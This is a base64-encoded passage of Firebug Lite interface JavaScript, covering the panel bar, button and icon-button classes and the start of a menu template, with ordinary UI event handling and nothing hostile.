nKTsNCiAgICAgICAgfQ0KICAgIH0sDQogICAgDQogICAgcmVtb3ZlQ29udHJvbGxlcjogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgZm9yICh2YXIgaT0wLCBhcmc7IGFyZz1hcmd1bWVudHNbaV07IGkrKykNCiAgICAgICAgew0KICAgICAgICAgICAgZm9yICh2YXIgaj0wLCBjOyBjPXRoaXMuY29udHJvbGxlcnNbal07IGorKykNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBpZiAoYXJnWzBdID09IGNbMF0gJiYgYXJnWzFdID09IGNbMV0gJiYgYXJnWzJdID09IGNbM10pDQogICAgICAgICAgICAgICAgICAgIHJlbW92ZUV2ZW50LmFwcGx5KHRoaXMsIGMpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfSwNCiAgICANCiAgICByZW1vdmVDb250cm9sbGVyczogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgZm9yICh2YXIgaT0wLCBjOyBjPXRoaXMuY29udHJvbGxlcnNbaV07IGkrKykNCiAgICAgICAgew0KICAgICAgICAgICAgcmVtb3ZlRXZlbnQuYXBwbHkodGhpcywgYyk7DQogICAgICAgIH0NCiAgICB9DQp9Ow0KDQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KLy8gUGFuZWxCYXINCg0KLyoqQG5hbWVzcGFjZSovDQpGQkwuUGFuZWxCYXIgPSANCnsNCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQogICAgDQogICAgcGFuZWxNYXA6IG51bGwsDQogICAgDQogICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KICAgIA0KICAgIHNlbGVjdGVkUGFuZWw6IG51bGwsDQogICAgcGFyZW50UGFuZWxOYW1lOiBudWxsLA0KICAgIA0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCiAgICANCiAgICBjcmVhdGU6IGZ1bmN0aW9uKG93bmVyUGFuZWwpDQogICAgew0KICAgICAgICB0aGlzLnBhbmVsTWFwID0ge307DQogICAgICAgIHRoaXMub3duZXJQYW5lbCA9IG93bmVyUGFuZWw7DQogICAgICAgIA0KICAgICAgICBpZiAob3duZXJQYW5lbCkNCiAgICAgICAgew0KICAgICAgICAgICAgb3duZXJQYW5lbC5zaWRlUGFuZWxCYXJOb2RlID0gY3JlYXRlRWxlbWVudCgic3BhbiIpOw0KICAgICAgICAgICAgb3duZXJQYW5lbC5zaWRlUGFuZWxCYXJOb2RlLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7DQogICAgICAgICAgICBvd25lclBhbmVsLnNpZGVQYW5lbEJhckJveE5vZGUuYXBwZW5kQ2hpbGQob3duZXJQYW5lbC5zaWRlUGFuZWxCYXJOb2RlKTsNCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgdmFyIHBhbmVscyA9IEZpcmVidWcucGFuZWxUeXBlczsNCiAgICAgICAgZm9yICh2YXIgaT0wLCBwOyBwPXBhbmVsc1tpXTsgaSsrKQ0KICAgICAgICB7DQogICAgICAgICAgICBpZiAoIC8vIG5vcm1hbCBQYW5lbCAgb2YgdGhlIENocm9tZSdzIFBhbmVsQmFyDQogICAgICAgICAgICAgICAgIW93bmVyUGFuZWwgJiYgIXAucHJvdG90eXBlLnBhcmVudFBhbmVsIHx8DQogICAgICAgICAgICAgICAgLy8gQ2hpbGQgUGFuZWwgb2YgdGhlIGN1cnJlbnQgUGFuZWwncyBTaWRlUGFuZWxCYXINCiAgICAgICAgICAgICAgICBvd25lclBhbmVsICYmIHAucHJvdG90eXBlLnBhcmVudFBhbmVsICYmIA0KICAgICAgICAgICAgICAgIG93bmVyUGFuZWwubmFtZSA9PSBwLnByb3RvdHlwZS5wYXJlbnRQYW5lbCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICB0aGlzLmFkZFBhbmVsKHAucHJvdG90eXBlLm5hbWUpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfSwNCiAgICANCiAgICBkZXN0cm95OiBmdW5jdGlvbigpDQogICAgew0KICAgICAgICBQYW5lbEJhci5zaHV0ZG93bi5jYWxsKHRoaXMpOw0KICAgICAgICANCiAgICAgICAgZm9yICh2YXIgbmFtZSBpbiB0aGlzLnBhbmVsTWFwKQ0KICAgICAgICB7DQogICAgICAgICAgICB0aGlzLnJlbW92ZVBhbmVsKG5hbWUpOw0KICAgICAgICAgICAgDQogICAgICAgICAgICB2YXIgcGFuZWwgPSB0aGlzLnBhbmVsTWFwW25hbWVdOw0KICAgICAgICAgICAgcGFuZWwuZGVzdHJveSgpOw0KICAgICAgICAgICAgDQogICAgICAgICAgICB0aGlzLnBhbmVsTWFwW25hbWVdID0gbnVsbDsNCiAgICAgICAgICAgIGRlbGV0ZSB0aGlzLnBhbmVsTWFwW25hbWVdOw0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICB0aGlzLnBhbmVsTWFwID0gbnVsbDsNCiAgICAgICAgdGhpcy5vd25lclBhbmVsID0gbnVsbDsNCiAgICB9LA0KICAgIA0KICAgIGluaXRpYWxpemU6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIGlmICh0aGlzLm93bmVyUGFuZWwpDQogICAgICAgICAgICB0aGlzLm93bmVyUGFuZWwuc2lkZVBhbmVsQmFyTm9kZS5zdHlsZS5kaXNwbGF5ID0gImlubGluZSI7DQogICAgICAgIA0KICAgICAgICBmb3IodmFyIG5hbWUgaW4gdGhpcy5wYW5lbE1hcCkNCiAgICAgICAgew0KICAgICAgICAgICAgKGZ1bmN0aW9uKHNlbGYsIG5hbWUpew0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIC8vIHRhYiBjbGljayBoYW5kbGVyDQogICAgICAgICAgICAgICAgdmFyIG9uVGFiQ2xpY2sgPSBmdW5jdGlvbiBvblRhYkNsaWNrKCkNCiAgICAgICAgICAgICAgICB7IA0KICAgICAgICAgICAgICAgICAgICBzZWxmLnNlbGVjdFBhbmVsKG5hbWUpOw0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBGaXJlYnVnLmNocm9tZS5hZGRDb250cm9sbGVyKFtzZWxmLnBhbmVsTWFwW25hbWVdLnRhYk5vZGUsICJtb3VzZWRvd24iLCBvblRhYkNsaWNrXSk7DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICB9KSh0aGlzLCBuYW1lKTsNCiAgICAgICAgfQ0KICAgIH0sDQogICAgDQogICAgc2h1dGRvd246IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIHZhciBzZWxlY3RlZFBhbmVsID0gdGhpcy5zZWxlY3RlZFBhbmVsOw0KICAgICAgICANCiAgICAgICAgaWYgKHNlbGVjdGVkUGFuZWwpDQogICAgICAgIHsNCiAgICAgICAgICAgIHJlbW92ZUNsYXNzKHNlbGVjdGVkUGFuZWwudGFiTm9kZSwgImZiU2VsZWN0ZWRUYWIiKTsNCiAgICAgICAgICAgIHNlbGVjdGVkUGFuZWwuaGlkZSgpOw0KICAgICAgICAgICAgc2VsZWN0ZWRQYW5lbC5zaHV0ZG93bigpOw0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICBpZiAodGhpcy5vd25lclBhbmVsKQ0KICAgICAgICAgICAgdGhpcy5vd25lclBhbmVsLnNpZGVQYW5lbEJhck5vZGUuc3R5bGUuZGlzcGxheSA9ICJub25lIjsgICAgICAgIA0KICAgICAgICANCiAgICAgICAgdGhpcy5zZWxlY3RlZFBhbmVsID0gbnVsbDsNCiAgICB9LA0KICAgIA0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCg0KICAgIGFkZFBhbmVsOiBmdW5jdGlvbihwYW5lbE5hbWUsIHBhcmVudFBhbmVsKQ0KICAgIHsNCiAgICAgICAgdmFyIFBhbmVsVHlwZSA9IEZpcmVidWcucGFuZWxUeXBlTWFwW3BhbmVsTmFtZV07DQogICAgICAgIHZhciBwYW5lbCA9IHRoaXMucGFuZWxNYXBbcGFuZWxOYW1lXSA9IG5ldyBQYW5lbFR5cGUoKTsNCiAgICAgICAgDQogICAgICAgIHBhbmVsLmNyZWF0ZSgpOw0KICAgIH0sDQogICAgDQogICAgcmVtb3ZlUGFuZWw6IGZ1bmN0aW9uKHBhbmVsTmFtZSkNCiAgICB7DQogICAgICAgIHZhciBwYW5lbCA9IHRoaXMucGFuZWxNYXBbcGFuZWxOYW1lXTsNCiAgICAgICAgaWYgKHBhbmVsLmhhc093blByb3BlcnR5KHBhbmVsTmFtZSkpDQogICAgICAgICAgICBwYW5lbC5kZXN0cm95KCk7DQogICAgfSwNCiAgICANCiAgICBzZWxlY3RQYW5lbDogZnVuY3Rpb24ocGFuZWxOYW1lKQ0KICAgIHsNCiAgICAgICAgdmFyIHNlbGVjdGVkUGFuZWwgPSB0aGlzLnNlbGVjdGVkUGFuZWw7DQogICAgICAgIHZhciBwYW5lbCA9IHRoaXMucGFuZWxNYXBbcGFuZWxOYW1lXTsNCiAgICAgICAgDQogICAgICAgIGlmIChwYW5lbCAmJiBzZWxlY3RlZFBhbmVsICE9IHBhbmVsKQ0KICAgICAgICB7DQogICAgICAgICAgICBpZiAoc2VsZWN0ZWRQYW5lbCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICByZW1vdmVDbGFzcyhzZWxlY3RlZFBhbmVsLnRhYk5vZGUsICJmYlNlbGVjdGVkVGFiIik7DQogICAgICAgICAgICAgICAgc2VsZWN0ZWRQYW5lbC5zaHV0ZG93bigpOw0KICAgICAgICAgICAgICAgIHNlbGVjdGVkUGFuZWwuaGlkZSgpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiAoIXBhbmVsLnBhcmVudFBhbmVsKQ0KICAgICAgICAgICAgICAgIEZpcmVidWcuY29udGV4dC5wZXJzaXN0ZWRTdGF0ZS5zZWxlY3RlZFBhbmVsTmFtZSA9IHBhbmVsTmFtZTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgdGhpcy5zZWxlY3RlZFBhbmVsID0gcGFuZWw7DQogICAgICAgICAgICANCiAgICAgICAgICAgIHNldENsYXNzKHBhbmVsLnRhYk5vZGUsICJmYlNlbGVjdGVkVGFiIik7DQogICAgICAgICAgICBwYW5lbC5zaG93KCk7DQogICAgICAgICAgICBwYW5lbC5pbml0aWFsaXplKCk7DQogICAgICAgIH0NCiAgICB9LA0KICAgIA0KICAgIGdldFBhbmVsOiBmdW5jdGlvbihwYW5lbE5hbWUpDQogICAgew0KICAgICAgICB2YXIgcGFuZWwgPSB0aGlzLnBhbmVsTWFwW3BhbmVsTmFtZV07DQogICAgICAgIA0KICAgICAgICByZXR1cm4gcGFuZWw7DQogICAgfQ0KICAgDQp9Ow0KDQovLyoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KLy8gQnV0dG9uDQoNCi8qKg0KICogb3B0aW9ucy5lbGVtZW50DQogKiBvcHRpb25zLmNhcHRpb24NCiAqIG9wdGlvbnMudGl0bGUNCiAqIA0KICogb3B0aW9ucy5vd25lcg0KICogb3B0aW9ucy5jbGFzc05hbWUNCiAqIG9wdGlvbnMucHJlc3NlZENsYXNzTmFtZQ0KICogDQogKiBvcHRpb25zLm9uUHJlc3MNCiAqIG9wdGlvbnMub25VbnByZXNzDQogKiBvcHRpb25zLm9uQ2xpY2sNCiAqIA0KICogQGNsYXNzDQogKiBAZXh0ZW5kcyBGQkwuQ29udHJvbGxlciANCiAqICANCiAqLw0KDQpGQkwuQnV0dG9uID0gZnVuY3Rpb24ob3B0aW9ucykNCnsNCiAgICBvcHRpb25zID0gb3B0aW9ucyB8fCB7fTsNCiAgICANCiAgICBhcHBlbmQodGhpcywgb3B0aW9ucyk7DQogICAgDQogICAgdGhpcy5zdGF0ZSA9ICJ1bnByZXNzZWQiOw0KICAgIHRoaXMuZGlzcGxheSA9ICJ1bnByZXNzZWQiOw0KICAgIA0KICAgIGlmICh0aGlzLmVsZW1lbnQpDQogICAgew0KICAgICAgICB0aGlzLmNvbnRhaW5lciA9IHRoaXMuZWxlbWVudC5wYXJlbnROb2RlOw0KICAgIH0NCiAgICBlbHNlDQogICAgew0KICAgICAgICB0aGlzLnNob3VsZERlc3Ryb3kgPSB0cnVlOw0KICAgICAgICANCiAgICAgICAgdGhpcy5jb250YWluZXIgPSB0aGlzLm93bmVyLmdldFBhbmVsKCkudG9vbEJ1dHRvbnNOb2RlOw0KICAgICAgICANCiAgICAgICAgdGhpcy5lbGVtZW50ID0gY3JlYXRlRWxlbWVudCgiYSIsIHsNCiAgICAgICAgICAgIGNsYXNzTmFtZTogdGhpcy5iYXNlQ2xhc3NOYW1lICsgIiAiICsgdGhpcy5jbGFzc05hbWUgKyAiIGZiSG92ZXIiLA0KICAgICAgICAgICAgaW5uZXJIVE1MOiB0aGlzLmNhcHRpb24NCiAgICAgICAgfSk7DQogICAgICAgIA0KICAgICAgICBpZiAodGhpcy50aXRsZSkNCiAgICAgICAgICAgIHRoaXMuZWxlbWVudC50aXRsZSA9IHRoaXMudGl0bGU7DQogICAgICAgIA0KICAgICAgICB0aGlzLmNvbnRhaW5lci5hcHBlbmRDaGlsZCh0aGlzLmVsZW1lbnQpOw0KICAgIH0NCn07DQoNCi8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQoNCkJ1dHRvbi5wcm90b3R5cGUgPSBleHRlbmQoQ29udHJvbGxlciwNCi8qKkBleHRlbmQgRkJMLkJ1dHRvbi5wcm90b3R5cGUqLw0Kew0KICAgIHR5cGU6ICJub3JtYWwiLA0KICAgIGNhcHRpb246ICJjYXB0aW9uIiwNCiAgICB0aXRsZTogbnVsbCwNCiAgICANCiAgICBjbGFzc05hbWU6ICIiLCAvLyBjdXN0b20gY2xhc3MNCiAgICBiYXNlQ2xhc3NOYW1lOiAiZmJCdXR0b24iLCAvLyBjb250cm9sIGNsYXNzDQogICAgcHJlc3NlZENsYXNzTmFtZTogImZiQnRuUHJlc3NlZCIsIC8vIGNvbnRyb2wgcHJlc3NlZCBjbGFzcw0KICAgIA0KICAgIGVsZW1lbnQ6IG51bGwsDQogICAgY29udGFpbmVyOiBudWxsLA0KICAgIG93bmVyOiBudWxsLA0KICAgIA0KICAgIHN0YXRlOiBudWxsLA0KICAgIGRpc3BsYXk6IG51bGwsDQogICAgDQogICAgZGVzdHJveTogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgdGhpcy5zaHV0ZG93bigpOw0KICAgICAgICANCiAgICAgICAgLy8gb25seSByZW1vdmUgaWYgaXQgaXMgYSBkeW5hbWljYWxseSBnZW5lcmF0ZWQgYnV0dG9uIChub3QgcHJlLXJlbmRlcmVkKQ0KICAgICAgICBpZiAodGhpcy5zaG91bGREZXN0cm95KQ0KICAgICAgICAgICAgdGhpcy5jb250YWluZXIucmVtb3ZlQ2hpbGQodGhpcy5lbGVtZW50KTsNCiAgICAgICAgDQogICAgICAgIHRoaXMuZWxlbWVudCA9IG51bGw7DQogICAgICAgIHRoaXMuY29udGFpbmVyID0gbnVsbDsNCiAgICAgICAgdGhpcy5vd25lciA9IG51bGw7DQogICAgfSwNCiAgICANCiAgICBpbml0aWFsaXplOiBmdW5jdGlvbigpDQogICAgew0KICAgICAgICBDb250cm9sbGVyLmluaXRpYWxpemUuYXBwbHkodGhpcyk7DQogICAgICAgIA0KICAgICAgICB2YXIgZWxlbWVudCA9IHRoaXMuZWxlbWVudDsNCiAgICAgICAgDQogICAgICAgIHRoaXMuYWRkQ29udHJvbGxlcihbZWxlbWVudCwgIm1vdXNlZG93biIsIHRoaXMuaGFuZGxlUHJlc3NdKTsNCiAgICAgICAgDQogICAgICAgIGlmICh0aGlzLnR5cGUgPT0gIm5vcm1hbCIpDQogICAgICAgICAgICB0aGlzLmFkZENvbnRyb2xsZXIoDQogICAgICAgICAgICAgICAgW2VsZW1lbnQsICJtb3VzZXVwIiwgdGhpcy5oYW5kbGVVbnByZXNzXSwNCiAgICAgICAgICAgICAgICBbZWxlbWVudCwgIm1vdXNlb3V0IiwgdGhpcy5oYW5kbGVVbnByZXNzXSwNCiAgICAgICAgICAgICAgICBbZWxlbWVudCwgImNsaWNrIiwgdGhpcy5oYW5kbGVDbGlja10NCiAgICAgICAgICAgICk7DQogICAgfSwNCiAgICANCiAgICBzaHV0ZG93bjogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgQ29udHJvbGxlci5zaHV0ZG93bi5hcHBseSh0aGlzKTsNCiAgICB9LA0KICAgIA0KICAgIHJlc3RvcmU6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIHRoaXMuY2hhbmdlU3RhdGUoInVucHJlc3NlZCIpOw0KICAgIH0sDQogICAgDQogICAgY2hhbmdlU3RhdGU6IGZ1bmN0aW9uKHN0YXRlKQ0KICAgIHsNCiAgICAgICAgdGhpcy5zdGF0ZSA9IHN0YXRlOw0KICAgICAgICB0aGlzLmNoYW5nZURpc3BsYXkoc3RhdGUpOw0KICAgIH0sDQogICAgDQogICAgY2hhbmdlRGlzcGxheTogZnVuY3Rpb24oZGlzcGxheSkNCiAgICB7DQogICAgICAgIGlmIChkaXNwbGF5ICE9IHRoaXMuZGlzcGxheSkNCiAgICAgICAgew0KICAgICAgICAgICAgaWYgKGRpc3BsYXkgPT0gInByZXNzZWQiKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHNldENsYXNzKHRoaXMuZWxlbWVudCwgdGhpcy5wcmVzc2VkQ2xhc3NOYW1lKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2UgaWYgKGRpc3BsYXkgPT0gInVucHJlc3NlZCIpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgcmVtb3ZlQ2xhc3ModGhpcy5lbGVtZW50LCB0aGlzLnByZXNzZWRDbGFzc05hbWUpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgdGhpcy5kaXNwbGF5ID0gZGlzcGxheTsNCiAgICAgICAgfQ0KICAgIH0sDQogICAgDQogICAgaGFuZGxlUHJlc3M6IGZ1bmN0aW9uKGV2ZW50KQ0KICAgIHsNCiAgICAgICAgY2FuY2VsRXZlbnQoZXZlbnQsIHRydWUpOw0KICAgICAgICANCiAgICAgICAgaWYgKHRoaXMudHlwZSA9PSAibm9ybWFsIikNCiAgICAgICAgew0KICAgICAgICAgICAgdGhpcy5jaGFuZ2VEaXNwbGF5KCJwcmVzc2VkIik7DQogICAgICAgICAgICB0aGlzLmJlZm9yZUNsaWNrID0gdHJ1ZTsNCiAgICAgICAgfQ0KICAgICAgICBlbHNlIGlmICh0aGlzLnR5cGUgPT0gInRvZ2dsZSIpDQogICAgICAgIHsNCiAgICAgICAgICAgIGlmICh0aGlzLnN0YXRlID09ICJwcmVzc2VkIikNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICB0aGlzLmNoYW5nZVN0YXRlKCJ1bnByZXNzZWQiKTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBpZiAodGhpcy5vblVucHJlc3MpDQogICAgICAgICAgICAgICAgICAgIHRoaXMub25VbnByZXNzLmFwcGx5KHRoaXMub3duZXIsIGFyZ3VtZW50cyk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdGhpcy5jaGFuZ2VTdGF0ZSgicHJlc3NlZCIpOw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIGlmICh0aGlzLm9uUHJlc3MpDQogICAgICAgICAgICAgICAgICAgIHRoaXMub25QcmVzcy5hcHBseSh0aGlzLm93bmVyLCBhcmd1bWVudHMpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiAodGhpcy5vbkNsaWNrKQ0KICAgICAgICAgICAgICAgIHRoaXMub25DbGljay5hcHBseSh0aGlzLm93bmVyLCBhcmd1bWVudHMpOw0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgfSwNCiAgICANCiAgICBoYW5kbGVVbnByZXNzOiBmdW5jdGlvbihldmVudCkNCiAgICB7DQogICAgICAgIGNhbmNlbEV2ZW50KGV2ZW50LCB0cnVlKTsNCiAgICAgICAgDQogICAgICAgIGlmICh0aGlzLmJlZm9yZUNsaWNrKQ0KICAgICAgICAgICAgdGhpcy5jaGFuZ2VEaXNwbGF5KCJ1bnByZXNzZWQiKTsNCiAgICAgICAgDQogICAgICAgIHJldHVybiBmYWxzZTsNCiAgICB9LA0KICAgIA0KICAgIGhhbmRsZUNsaWNrOiBmdW5jdGlvbihldmVudCkNCiAgICB7DQogICAgICAgIGNhbmNlbEV2ZW50KGV2ZW50LCB0cnVlKTsNCiAgICAgICAgDQogICAgICAgIGlmICh0aGlzLnR5cGUgPT0gIm5vcm1hbCIpDQogICAgICAgIHsNCiAgICAgICAgICAgIGlmICh0aGlzLm9uQ2xpY2spDQogICAgICAgICAgICAgICAgdGhpcy5vbkNsaWNrLmFwcGx5KHRoaXMub3duZXIpOw0KICAgICAgICAgICAgDQogICAgICAgICAgICB0aGlzLmNoYW5nZVN0YXRlKCJ1bnByZXNzZWQiKTsNCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgdGhpcy5iZWZvcmVDbGljayA9IGZhbHNlOw0KICAgICAgICANCiAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgIH0NCn0pOw0KDQovLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KDQovKioNCiAqIEBjbGFzcw0KICogQGV4dGVuZHMgRkJMLkJ1dHRvbiANCiAqLw0KRkJMLkljb25CdXR0b24gPSBmdW5jdGlvbigpDQp7DQogICAgQnV0dG9uLmFwcGx5KHRoaXMsIGFyZ3VtZW50cyk7DQp9Ow0KDQpJY29uQnV0dG9uLnByb3RvdHlwZSA9IGV4dGVuZChCdXR0b24ucHJvdG90eXBlLA0KLyoqQGV4dGVuZCBGQkwuSWNvbkJ1dHRvbi5wcm90b3R5cGUqLyANCnsNCiAgICBiYXNlQ2xhc3NOYW1lOiAiZmJJY29uQnV0dG9uIiwNCiAgICBwcmVzc2VkQ2xhc3NOYW1lOiAiZmJJY29uUHJlc3NlZCINCn0pOw0KDQoNCi8vKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQovLyBNZW51DQoNCnZhciBtZW51SXRlbVByb3BzID0geyJjbGFzcyI6ICIkaXRlbS5jbGFzc05hbWUiLCB0eXBlOiAiJGl0ZW0udHlwZSIsIHZhbHVlOiAiJGl0ZW0udmFsdWUiLA0KICAgICAgICBfY29tbWFuZDogIiRpdGVtLmNvbW1hbmQifTsNCg0KaWYgKGlzSUU2KQ0KICAgIG1lbnVJdGVtUHJvcHMuaHJlZiA9ICJqYXZhc2NyaXB0OnZvaWQoMCkiOw0KDQovLyBBbGxvdyBHVUkgdG8gYmUgbG9hZGVkIGV2ZW4gd2hlbiBEb21wbGF0ZSBtb2R1bGUgaXMgbm90IGluc3RhbGxlZC4NCmlmIChGQkwuZG9tcGxhdGUpDQp2YXIgTWVudVBsYXRlID0gZG9tcGxhdGUoRmlyZWJ1Zy5SZXAsDQp7DQogICAgdGFnOg0KICAgICAgICBESVYoeyJjbGFzcyI6ICJmYk1lbnUgZmJTaGFkb3cifSwNCiAgICAgICAgICAgIERJVih7ImNsYXNzIjogImZiTWVudUNvbnRlbnQgZmJTaGFkb3dDb250ZW50In0sDQogICAgICAgICAgICAgICAgRk9SKCJpdGVtIiwgIiRvYmplY3QuaXRlbXN8bWVtYmVySXRlcmF0b3IiLA0KICAgICAgICAgICAgICAgICAgICBUQUcoIiRpdGVtLnRhZyIsIHtpdGVtOiAiJGl0ZW0ifSkNCiAgICAgICAgICAgICAgICApDQogICAgICAgICAgICApDQogICAgICAgICksDQogICAgICAgIA0KICAgIGl0ZW1UYWc6DQogICAgICAgIEEobWVudUl0ZW1Qcm9wcywNCiAgICAgICAgICAgICIkaXRlbS5sYWJlbCINCiAgICAgICAgKSwNCiAgICAgICAgDQogICAgY2hlY2tCb3hUYWc6DQogICAgICAgIEEoZXh0ZW5kKG1lbnVJdGVtUHJvcHMsIHtjaGVja2VkIDogIiRpdGVtLmNoZWNrZWQifSksDQogICAgICAgICAgIA0KICAgICAgICAgICAgIiRpdGVtLmxhYmVsIg0KICAgICAgICApLA0KICAgICAgICANCiAgICByYWRpb0J1dHRvblRhZzoNCiAgICAgICAgQShleHRlbmQobWVudUl0ZW1Qcm9wcywge3NlbGVjdGVkIDogIiRpdGVtLnNlbGVjdGVkIn0pLA0KICAgICAgICAgICANCiAgICAgICAgICAgICIkaXRlbS5sYWJlbCINCiAgICAgICAgKSwNCiAgICAgICAgDQogICAgZ3JvdXBUYWc6DQogICAgICAgIEEoZXh0ZW5kKG1lbnVJdGVtUHJvcHMsIHtjaGlsZDogIiRpdGVtLmNoaWxkIn0pLA0KICAgICAgICAgICAgIiRpdGVtLmxhYmVsIg0KICAgICAgICApLA0KICAgICAgICANCiAgICBzaG9ydGN1dFRhZzoNCiAgICAgICAgQShtZW51SXRlbVByb3BzLA0KICAgICAgICAgICAgIiRpdGVtLmxhYmVsIiwNCiAgICAgICAgICAgIFNQQU4oeyJjbGFzcyI6ICJmYk1lbnVTaG9ydGN1dEtleSJ9LA0KICAgICAgICAgICAgICAgICIkaXRlbS5rZXkiDQogICAgICAgICAgICApDQogICAgICAgICksDQogICAgICAgIA0KICAgIHNlcGFyYXRvclRhZzoNCiAgICAgICAgU1BBTih7ImNsYXNzIjogImZiTWVudVNlcGFyYXRvciJ9KSwNCiAgICAgICAgDQogICAgbWVtYmVySXRlcmF0b3I6IGZ1bmN0aW9uKGl0ZW1zKQ0KICAgIHsNCiAgICAgICAgdmFyIHJlc3VsdCA9IFtdOw0KICAgICAgICANCiAgICAgICAgZm9yICh2YXIgaT0wLCBsZW5ndGg9aXRlbXMubGVuZ3RoOyBpPGxlbmd0aDsgaSsrKQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgaXRlbSA9IGl0ZW1zW2ldOw0KICAgICAgICAgICAgDQogICAgICAgICAgICAvLyBzZXBhcmF0b3IgcmVwcmVzZW50YXRpb24NCiAgICAgICAgICAgIGlmICh0eXBlb2YgaXRlbSA9PSAic3RyaW5nIiAmJiBpdGVtLmluZGV4T2YoIi0iKSA9PSAwKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHJlc3VsdC5wdXNoKHt0YWc6IHRoaXMuc2VwYXJhdG9yVGFnfSk7DQogICAgICAgICAgICAgICAgY29udGludWU7DQogICAgICAgICAgICB9DQogICAgICAgICAgICANCiAgICAgICAgICAgIGl0ZW0gPSBleHRlbmQoaXRlbSwge30pOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBpdGVtLnR5cGUgPSBpdGVtLnR5cGUgfHwgIiI7DQogICAgICAgICAgICBpdGVtLnZhbHVlID0gaXRlbS52YWx1ZSB8fCAiIjsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgdmFyIHR5cGUgPSBpdGVtLnR5cGU7DQogICAgICAgICAgICANCiAgICAgICAgICAgIC8vIGRlZmF1bHQgaXRlbSByZXByZXNlbnRhdGlvbg0KICAgICAgICAgICAgaXRlbS50YWcgPSB0aGlzLml0ZW1UYWc7DQogICAgICAgICAgICANCiAgICAgICAgICAgIHZhciBjbGFzc05hbWUgPSBpdGVtLmNsYXNzTmFtZSB8fCAiIjsgDQogICAgICAgICAgICANCiAgICAgICAgICAgIGNsYXNzTmFtZSArPSAiZmJNZW51T3B0aW9uIGZiSG92ZXIgIjsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgLy8gc3BlY2lmaWMgcmVwcmVzZW50YXRpb25zDQogICAgICAgICAgICBpZiAodHlwZSA9PSAiY2hlY2tib3giKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGNsYXNzTmFtZSArPSAiZmJNZW51Q2hlY2tCb3ggIjsNCiAgICAgICAgICAgICAgICBpdGVtLnRhZyA9IHRoaXMuY2hlY2tCb3hUYWc7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlIGlmICh0eXBlID09ICJyYWRpb2J1dHRvbiIpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgY2xhc3NOYW1lICs9ICJmYk